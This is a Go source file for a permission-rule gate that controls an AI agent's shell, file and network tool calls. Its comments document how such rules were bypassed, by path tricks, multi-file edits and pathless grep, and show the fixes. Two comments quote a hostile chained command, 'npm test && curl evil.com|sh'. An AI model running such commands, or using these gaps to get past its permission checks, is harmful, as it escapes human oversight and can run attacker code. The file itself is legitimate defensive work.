package permission

import (
	"context"
	"encoding/json"
	"fmt"
	"path"
	"regexp"
	"runtime"
	"strings"
	"sync"

	"github.com/fiddler110/aegis/internal/tool"
)

// RuleAction is the effect of a permission rule.
type RuleAction int

const (
	RuleAllow RuleAction = iota
	RuleDeny
)

func (a RuleAction) String() string {
	if a == RuleDeny {
		return "deny"
	}
	return "allow"
}

// Rule is a text-based, versionable permission rule of the form
//
//	allow <tool>(<pattern>)
//	deny  <tool>(<pattern>)
//
// <tool> is a tool name (e.g. "shell", "write_file"), a friendly alias
// ("bash", "write", "read", "network"), or "*" for any tool. <pattern> is a
// glob matched against the tool's primary input field (command for exec tools,
// path for file tools, url for network tools). A missing "(<pattern>)" — e.g.
// "allow read" — is equivalent to "*" and matches any input.
type Rule struct {
	Action  RuleAction
	Tool    string // tool name, alias, or "*"
	Pattern string // glob; "*" matches any subject
	raw     string // original text, for audit messages
	re      *regexp.Regexp
	// reExec is an alternate compilation of Pattern used for RuleAllow rules
	// matched against execute-capability tools (P7.3): "*"/"?" cannot span
	// shell chaining/substitution metacharacters, so a scoping rule like
	// "allow bash(npm test*)" cannot be bypassed by appending "&& curl
	// evil.com|sh" to an otherwise-matching command. Deny rules deliberately
	// keep the broad re: over-matching on a deny is safe, under-matching on
	// an allow is not.
	reExec *regexp.Regexp
	// rePath is Pattern compiled after path normalization (P7.8), used instead
	// of re/reExec when matching a Read/Write-capability tool: rule matching
	// otherwise compares the tool call's raw, unnormalized path string, so a
	// "deny write(secrets/*)" rule is trivially evaded via "./secrets/x", a
	// case-insensitive filesystem, or a backslash/forward-slash mismatch on
	// Windows — the actual write still succeeds because only the sandbox's
	// root-confinement check runs the real normalization, not rule matching.
	rePath *regexp.Regexp
}

var ruleSyntax = regexp.MustCompile(`^(allow|deny)\s+([A-Za-z_*][\w*]*)\s*(?:\(\s*(.*?)\s*\))?$`)

// ParseRule parses a single rule line. Surrounding and internal whitespace is
// trimmed; an empty or malformed line returns an error.
func ParseRule(s string) (Rule, error) {
	trimmed := strings.TrimSpace(s)
	m := ruleSyntax.FindStringSubmatch(trimmed)
	if m == nil {
		return Rule{}, fmt.Errorf("invalid permission rule %q: want \"allow|deny tool(pattern)\"", s)
	}
	action := RuleAllow
	if m[1] == "deny" {
		action = RuleDeny
	}
	pattern := strings.TrimSpace(m[3])
	if pattern == "" {
		pattern = "*"
	}
	return Rule{
		Action:  action,
		Tool:    m[2],
		Pattern: pattern,
		raw:     trimmed,
		re:      globToRegexp(pattern),
		reExec:  globToRegexpExec(pattern),
		rePath:  globToRegexp(normalizePathLike(pattern)),
	}, nil
}

// ParseRules parses a list of rule lines, skipping blank lines and # comments.
// It returns an error on the first malformed rule.
func ParseRules(lines []string) ([]Rule, error) {
	var rules []Rule
	for _, line := range lines {
		t := strings.TrimSpace(line)
		if t == "" || strings.HasPrefix(t, "#") {
			continue
		}
		r, err := ParseRule(t)
		if err != nil {
			return nil, err
		}
		rules = append(rules, r)
	}
	return rules, nil
}

// matches reports whether the rule applies to a tool call. The tool name (and
// its capability) is matched against the rule's Tool field, and the rule's
// glob is matched against the subject extracted from the input. An allow rule
// scoping an execute-capability tool uses the metachar-restricted reExec
// instead of re (P7.3), so it cannot be widened by shell chaining.
func (r Rule) matches(t tool.Tool, subject string) bool {
	if !ruleToolMatches(r.Tool, t) {
		return false
	}
	switch t.Capability() {
	case tool.CapRead:
		if bulkScopeToolNames[t.Name()] {
			return r.matchesBulkScope(subject)
		}
		return r.rePath.MatchString(normalizePathLike(subject))
	case tool.CapWrite:
		return r.rePath.MatchString(normalizePathLike(subject))
	case tool.CapExecute:
		if r.Action == RuleAllow {
			return r.reExec.MatchString(subject)
		}
	}
	return r.re.MatchString(subject)
}

// matchesAny reports whether the rule matches at least one of a call's
// subjects. This is the deny direction: a multi-file write is denied when any
// single path it touches is denied, because the call is all-or-nothing and
// letting it through would write the denied path along with the rest.
func (r Rule) matchesAny(t tool.Tool, subjects []string) bool {
	for _, s := range subjects {
		if r.matches(t, s) {
			return true
		}
	}
	return false
}

// matchesAll reports whether the rule matches every one of a call's subjects.
// This is the allow direction, and the asymmetry with matchesAny is deliberate
// — the same asymmetry matchesBulkScope already documents. A scoped
// "allow write(docs/**)" is clearance for the paths it names, so a call that
// touches docs/a.md *and* src/main.go must not be auto-approved wholesale on
// the strength of the first one. Falling through to the base gate (which
// prompts) is the right outcome there, not a silent grant.
//
// An empty subject set never satisfies an allow rule.
func (r Rule) matchesAll(t tool.Tool, subjects []string) bool {
	if len(subjects) == 0 {
		return false
	}
	for _, s := range subjects {
		if !r.matches(t, s) {
			return false
		}
	}
	return true
}

// bulkScopeToolNames are Read-capability tools whose path-like input argument
// (if any) is a search *root*, not the object actually read — any descendant
// of that root may end up in the tool's output (P74.1). grep and glob take no
// root argument at all: both always walk the whole workspace root
// (effectiveRoot) and use their glob-shaped field only as a filter, so their
// scope is the entire tree unless that filter narrows it. This is why the
// ordinary CapRead path match is wrong for them — subjectFor's old CapRead
// branch (firstNonEmpty(path, file_path)) was always "" for grep, so
// normalizePathLike("") = "." never satisfied a "secrets/**"-shaped pattern,
// and a deny rule scoping a directory silently never fired. Keyed by name
// because "is this call's path a scope or an object" is a property of the
// tool, not something a generic schema field can advertise.
var bulkScopeToolNames = map[string]bool{
	"grep": true,
	"glob": true,
	"ls":   true,
}

// matchesBulkScope reports whether the rule's pattern can match anything a
// bulk-scope call (grep/glob/ls) might actually surface. subject is either a
// literal scope-narrowing filter — ls's path, or grep/glob's glob-shaped
// field — or "." (bulkScopeSubject's sentinel) when the call named no root or
// filter at all, meaning it walks the entire workspace unconstrained.
//
// Deny fires on any possible overlap between the two, including
// unconditionally against the unconstrained "." case: over-matching a deny is
// safe (the same asymmetry globToRegexpExec documents for exec allow-rules),
// and this is specifically what closes the P74.1 gap — a deny rule that stops
// read_file on a path must equally stop grep from surfacing the same file's
// contents via a pathless call. Allow is the conservative direction instead:
// an unconstrained "." call only satisfies a "*" allow, never a scoped one,
// so a scoped "allow grep(docs/**)" can't be read as clearance to search the
// whole tree just because one particular call happened to search all of it.
func (r Rule) matchesBulkScope(subject string) bool {
	scope := normalizePathLike(subject)
	if scope == "." {
		if r.Action == RuleDeny {
			return true
		}
		return r.Pattern == "*"
	}
	return pathScopeIntersects(scope, r.Pattern)
}

// bulkScopeSubject picks the field that bounds a bulk-scope tool call's
// search, or "." when the call gave none: ls's directory argument, glob's
// pattern (which *is* its whole scope, not just a filter on top of one), or
// grep's optional glob filter. Deliberately never "" — subjectFor returning
// "" is the exact P74.1 symptom (a subject WarnUnmatchableRules cannot tell
// apart from "no subject field exists at all"), and "." reads correctly as
// "unconstrained" through normalizePathLike either way.
func bulkScopeSubject(toolName, path, pattern, glob string) string {
	switch toolName {
	case "ls":
		if path != "" {
			return path
		}
	case "glob":
		if pattern != "" {
			return pattern
		}
	case "grep":
		if glob != "" {
			return glob
		}
	}
	return "."
}

// pathScopeIntersects reports whether a bulk-scope call's narrowing filter
// (already normalized) can share any match with a rule's pattern. Both are
// Aegis's path-globs — literal runs plus "*"/"**"/"?" — simple enough that
// comparing literal prefixes (the fixed text before either pattern's first
// wildcard) decides intersection exactly for the cases that matter: if one
// pattern's fixed prefix is a path-boundary prefix of the other's, some path
// can satisfy both; otherwise the two are scoped to disjoint subtrees.
func pathScopeIntersects(scope, pattern string) bool {
	pattern = normalizePathLike(pattern)
	scopePrefix := literalPrefix(scope)
	patternPrefix := literalPrefix(pattern)
	return isPathPrefixOf(scopePrefix, patternPrefix) || isPathPrefixOf(patternPrefix, scopePrefix)
}

// literalPrefix returns the portion of a glob before its first wildcard
// character, which bounds every path the glob can possibly match.
func literalPrefix(glob string) string {
	if i := strings.IndexAny(glob, "*?"); i >= 0 {
		return glob[:i]
	}
	return glob
}

// isPathPrefixOf reports whether prefix is a path-boundary-respecting prefix
// of s: equal, empty (matches anything, e.g. a pattern like "**/*.go" whose
// literal prefix is ""), or s continues past prefix at a "/" — so "secrets"
// is a prefix of "secrets/x" but not of "secrets-archive".
func isPathPrefixOf(prefix, s string) bool {
	if prefix == "" || prefix == s {
		return true
	}
	rest, ok := strings.CutPrefix(s, prefix)
	return ok && strings.HasPrefix(rest, "/")
}

// normalizePathLike canonicalizes a file-path subject or pattern before a
// Read/Write-capability rule match (P7.8): separators are unified to "/" and
// lexically cleaned (collapsing "./" and resolving ".." segments) so a
// traversal trick like "./secrets/x" can't dodge a "secrets/*" rule, and the
// result is case-folded on platforms whose default filesystem is
// case-insensitive (Windows; macOS's HFS+/APFS default) so a case variant
// can't do the same. Both the extracted subject and the rule's own pattern go
// through this identically, so the comparison stays symmetric.
func normalizePathLike(s string) string {
	if s == "" {
		return s
	}
	s = strings.ReplaceAll(s, "\\", "/")
	s = path.Clean(s)
	if runtime.GOOS == "windows" || runtime.GOOS == "darwin" {
		s = strings.ToLower(s)
	}
	return s
}

// ruleToolMatches reports whether a rule's tool selector matches a tool. The
// selector is "*" (any), an exact tool name, or a capability alias.
func ruleToolMatches(selector string, t tool.Tool) bool {
	if selector == "*" {
		return true
	}
	if selector == t.Name() {
		return true
	}
	switch strings.ToLower(selector) {
	case "bash", "sh", "shell", "exec", "execute":
		return t.Capability() == tool.CapExecute
	case "write":
		return t.Capability() == tool.CapWrite
	case "read":
		return t.Capability() == tool.CapRead
	case "network", "net", "fetch":
		return t.Capability() == tool.CapNetwork
	}
	return false
}

// subjectFieldsByCapability is the single source of truth for which input
// fields subjectFor reads for each tool capability, and in what preference
// order. subjectFieldNames (the flat list WarnUnmatchableRules reports as
// "recognized") is derived from it below, so the two can never drift out of
// agreement the way the pre-P74.1 grep case did: back then subjectFor's
// switch and the reasoning about which fields "count" as a subject lived in
// two unconnected places, and grep's scope field was recognized by neither.
// Adding a field for a capability here is now the only edit needed for both
// extraction and the no-op-rule warning to see it. This mirrors
// bulkScopeToolNames just above, which closes the same class of gap for the
// bulk-scope tool *names* rather than the *fields*.
var subjectFieldsByCapability = []struct {
	cap    tool.Capability
	fields []string
}{
	// Falling back to path/file_path covers execute-capability tools whose
	// primary scoping field is a workspace path rather than a shell command —
	// security_scan and latex_build both declare "path" and no "command" at
	// all, so they hit the same P74.1 shape as grep: a recognized subject
	// field the extraction switch never consulted.
	{tool.CapExecute, []string{"command", "path", "file_path"}},
	{tool.CapWrite, []string{"path", "file_path"}},
	// Falling back to query/pattern (not just path/file_path) closes the same
	// class of gap P74.1 fixed for grep on other CapRead tools whose primary
	// field is a search term rather than a path — project_knowledge and
	// entity_recall both declare only "query", and previously landed here
	// with neither path field set, so subjectFor returned "" for them exactly
	// like it used to for grep despite toolHasSubjectField saying a rule
	// could match.
	{tool.CapRead, []string{"path", "file_path", "query", "pattern"}},
	{tool.CapNetwork, []string{"url", "query"}},
}

// subjectFieldNames are the input-field names subjectFor knows how to read,
// deduplicated across every capability in subjectFieldsByCapability. A tool
// whose schema exposes none of these can never contribute a non-empty
// subject, so a rule scoping it with anything other than "*" is a silent
// no-op (P7.7) — see WarnUnmatchableRules.
var subjectFieldNames = buildSubjectFieldNames()

func buildSubjectFieldNames() []string {
	seen := make(map[string]bool)
	var out []string
	for _, entry := range subjectFieldsByCapability {
		for _, f := range entry.fields {
			if !seen[f] {
				seen[f] = true
				out = append(out, f)
			}
		}
	}
	return out
}

// subjectFieldsFor returns the ordered field list subjectFor reads for a
// capability, or nil if the capability has no entry in
// subjectFieldsByCapability (the "unknown capability" fallback in subjectFor
// then reads every recognized field instead).
func subjectFieldsFor(cap tool.Capability) []string {
	for _, entry := range subjectFieldsByCapability {
		if entry.cap == cap {
			return entry.fields
		}
	}
	return nil
}

// subjectsFor returns every subject a rule must be tested against for one call.
//
// It exists because a rule matches one string while a call may name several
// files. multi_edit is the case that forced it: its schema carries *only*
// edits[].path — no top-level path or file_path — so subjectFor returned "" for
// it and a path-scoped rule could never match. `deny write(secrets/**)` blocked
// write_file on secrets/key.pem and allowed multi_edit on the identical path,
// with no diagnostic anywhere: WarnUnmatchableRules stays quiet because the
// rule does match the other write tools.
//
// For every tool with a single path field — which is all of them but multi_edit
// — this returns exactly one subject and the matching below is bit-for-bit what
// it always was.
func subjectsFor(t tool.Tool, input json.RawMessage) []string {
	primary := subjectFor(t, input)
	extra := editPathsFromInput(input)
	if len(extra) == 0 {
		return []string{primary}
	}
	if primary == "" {
		return extra
	}
	return append([]string{primary}, extra...)
}

// editPathsFromInput extracts the edits[].path values from a multi-file edit
// call, or nil for the input shapes that don't carry them. It is the one
// spelling of that extraction in this package — scopeWritePaths (scope.go) uses
// it too, so the scope gate and the rule gate cannot come to disagree about
// which files a multi_edit call touches, which is exactly how they had already
// diverged.
func editPathsFromInput(input json.RawMessage) []string {
	if len(input) == 0 {
		return nil
	}
	var args struct {
		Edits []struct {
			Path string `json:"path"`
		} `json:"edits"`
	}
	if json.Unmarshal(input, &args) != nil {
		return nil
	}
	var paths []string
	for _, e := range args.Edits {
		if e.Path != "" {
			paths = append(paths, e.Path)
		}
	}
	return paths
}

// subjectFor extracts the string a rule's glob matches against, choosing the
// field most relevant to the tool's capability and falling back to any common
// field present in the input. It answers for a single path field; a call naming
// several files goes through subjectsFor, which wraps this.
func subjectFor(t tool.Tool, input json.RawMessage) string {
	if len(input) == 0 {
		return ""
	}
	var args struct {
		Command  string `json:"command"`
		Path     string `json:"path"`
		FilePath string `json:"file_path"`
		URL      string `json:"url"`
		Query    string `json:"query"`
		Pattern  string `json:"pattern"`
		Glob     string `json:"glob"`
	}
	if json.Unmarshal(input, &args) != nil {
		return ""
	}
	if t.Capability() == tool.CapRead && bulkScopeToolNames[t.Name()] {
		return bulkScopeSubject(t.Name(), args.Path, args.Pattern, args.Glob)
	}
	values := map[string]string{
		"command":   args.Command,
		"path":      args.Path,
		"file_path": args.FilePath,
		"url":       args.URL,
		"query":     args.Query,
		"pattern":   args.Pattern,
	}
	fields := subjectFieldsFor(t.Capability())
	if fields == nil {
		fields = subjectFieldNames
	}
	vals := make([]string, len(fields))
	for i, f := range fields {
		vals[i] = values[f]
	}
	return firstNonEmpty(vals...)
}

func firstNonEmpty(vals ...string) string {
	for _, v := range vals {
		if v != "" {
			return v
		}
	}
	return ""
}

// globToRegexp converts a permission glob to an anchored regexp. Unlike
// path.Match, "*" spans path separators so "/etc/*" matches "/etc/a/b"; this is
// the intuitive behaviour for blast-radius rules. "?" matches a single
// character. All other characters are matched literally.
func globToRegexp(glob string) *regexp.Regexp {
	var b strings.Builder
	b.WriteString("^")
	for _, r := range glob {
		switch r {
		case '*':
			b.WriteString(".*")
		case '?':
			b.WriteString(".")
		default:
			b.WriteString(regexp.QuoteMeta(string(r)))
		}
	}
	b.WriteString("$")
	// glob patterns are simple enough that compilation cannot fail, but guard
	// anyway with a never-matching fallback.
	re, err := regexp.Compile(b.String())
	if err != nil {
		return regexp.MustCompile(`$.^`)
	}
	return re
}

// ShellChainMetaChars is the character class excluded from "*"/"?" expansion
// by globToRegexpExec (P7.3): these are the shell characters that chain,
// pipe, substitute, or redirect, so letting a wildcard span them lets a
// scoped allow rule be widened by appending extra commands. Exported so
// other packages that need to recognize the same class of shell-injection
// risk (the TUI's allow-always rule suggestion, the read-only shell
// classifier — P25.4) share one definition instead of drifting apart.
const ShellChainMetaChars = `;&|` + "`" + `$()<>` + "\n\r"

// globToRegexpExec is globToRegexp's counterpart for allow-rules scoping an
// execute-capability tool. Unlike globToRegexp's "*" → ".*" (which spans
// everything, including shell chaining metacharacters), "*"/"?" here cannot
// match any character in ShellChainMetaChars. This closes the gap where
// "allow bash(npm test*)" — compiled the ordinary way to "^npm test.*$" —
// also matches "npm test && curl evil.com|sh", giving a rule meant to narrow
// auto-approval to one command no real boundary against shell injection.
// Literal (non-wildcard) characters in the pattern, including metacharacters
// the rule author wrote explicitly, still match exactly as before.
func globToRegexpExec(glob string) *regexp.Regexp {
	var b strings.Builder
	b.WriteString("^")
	for _, r := range glob {
		switch r {
		case '*':
			b.WriteString("[^" + ShellChainMetaChars + "]*")
		case '?':
			b.WriteString("[^" + ShellChainMetaChars + "]")
		default:
			b.WriteString(regexp.QuoteMeta(string(r)))
		}
	}
	b.WriteString("$")
	re, err := regexp.Compile(b.String())
	if err != nil {
		return regexp.MustCompile(`$.^`)
	}
	return re
}

// checker is the minimal decision interface RuleGate composes over, satisfied
// by both the concrete Gate (value receiver) and *ContextualGate.
type checker interface {
	Check(ctx context.Context, t tool.Tool, input json.RawMessage) (bool, string)
}

// RuleGate wraps a base gate and applies text-based allow/deny rules before the
// wrapped gate's decision. Precedence: an explicit deny always blocks; otherwise
// an explicit allow grants (bypassing the wrapped gate and any approver);
// otherwise the call defers to the wrapped gate. RuleGate is intended to be the
// outermost gate so rules are evaluated before the mode and contextual gates.
type RuleGate struct {
	base       checker
	rules      []Rule
	mu         sync.Mutex
	onDecision func(ContextualDecision)
}

// RuleOption configures a RuleGate.
type RuleOption func(*RuleGate)

// WithRuleObserver registers a callback invoked for each rule that decides a
// call (for audit/observability), mirroring ContextualGate's OnDecision.
func WithRuleObserver(fn func(ContextualDecision)) RuleOption {
	return func(g *RuleGate) { g.onDecision = fn }
}

// NewRuleGate wraps base with the given rules.
func NewRuleGate(base checker, rules []Rule, opts ...RuleOption) *RuleGate {
	g := &RuleGate{base: base, rules: rules}
	for _, o := range opts {
		o(g)
	}
	return g
}

// Check implements engine.Gate.
func (g *RuleGate) Check(ctx context.Context, t tool.Tool, input json.RawMessage) (bool, string) {
	subjects := subjectsFor(t, input)

	// Deny rules take precedence and are evaluated first, and match on *any*
	// subject; allow rules below require *all* of them. See matchesAny/matchesAll.
	for _, r := range g.rules {
		if r.Action == RuleDeny && r.matchesAny(t, subjects) {
			reason := fmt.Sprintf("%s blocked by permission rule: %s", t.Name(), r.raw)
			g.emit(t, r, Deny, reason)
			return false, reason
		}
	}
	// An explicit allow short-circuits the mode gate and approver.
	for _, r := range g.rules {
		if r.Action == RuleAllow && r.matchesAll(t, subjects) {
			g.emit(t, r, Allow, "allowed by permission rule: "+r.raw)
			return true, ""
		}
	}
	// No rule matched — defer to the base (mode-level) gate.
	return g.base.Check(ctx, t, input)
}

func (g *RuleGate) emit(t tool.Tool, r Rule, d Decision, reason string) {
	if g.onDecision == nil {
		return
	}
	g.mu.Lock()
	fn := g.onDecision
	g.mu.Unlock()
	fn(ContextualDecision{
		Tool:     t.Name(),
		Cap:      string(t.Capability()),
		Rule:     "permission_rule:" + r.raw,
		Decision: d,
		Reason:   reason,
	})
}

// WarnUnmatchableRules flags, via warn, any scoped (non-"*" pattern) rule
// whose Tool selector matches a registered tool whose declared input schema
// exposes none of subjectFieldNames (P7.7). subjectFor can only ever return
// "" for such a tool, so the rule's pattern never matches — a scoped
// "deny write(/etc/*)"-style rule silently never blocks that tool instead of
// failing loudly, which is a false sense of security rather than an active
// exploit. Intended to run once at startup against the full tool registry,
// not per tool call.
func WarnUnmatchableRules(rules []Rule, tools []tool.Tool, warn func(msg string, args ...any)) {
	if warn == nil {
		return
	}
	for _, r := range rules {
		if r.Pattern == "*" {
			continue // matches "" trivially; not a no-op
		}
		for _, t := range tools {
			if !ruleToolMatches(r.Tool, t) {
				continue
			}
			if toolHasSubjectField(t) {
				continue
			}
			warn("permission rule can never match this tool and is a silent no-op: its input schema has none of the recognized subject fields",
				"rule", r.raw, "tool", t.Name(), "capability", string(t.Capability()),
				"recognized_fields", strings.Join(subjectFieldNames, ", "))
		}
	}
}

// toolHasSubjectField reports whether t's declared input schema exposes at
// least one of subjectFieldNames. An unparseable schema returns true so a
// schema we can't introspect never produces a false-positive warning.
//
// "edits" counts, because subjectsFor now reads edits[].path. Before that it
// did not, and multi_edit was correctly reported here as unmatchable while
// being silently unmatched at Check time — the warning was right and the gate
// was wrong. Now that the gate matches, the warning has to stop firing or it
// becomes the false positive.
func toolHasSubjectField(t tool.Tool) bool {
	var schema struct {
		Properties map[string]json.RawMessage `json:"properties"`
	}
	if json.Unmarshal(t.InputSchema(), &schema) != nil {
		return true
	}
	if _, ok := schema.Properties["edits"]; ok {
		return true
	}
	for _, f := range subjectFieldNames {
		if _, ok := schema.Properties[f]; ok {
			return true
		}
	}
	return false
}
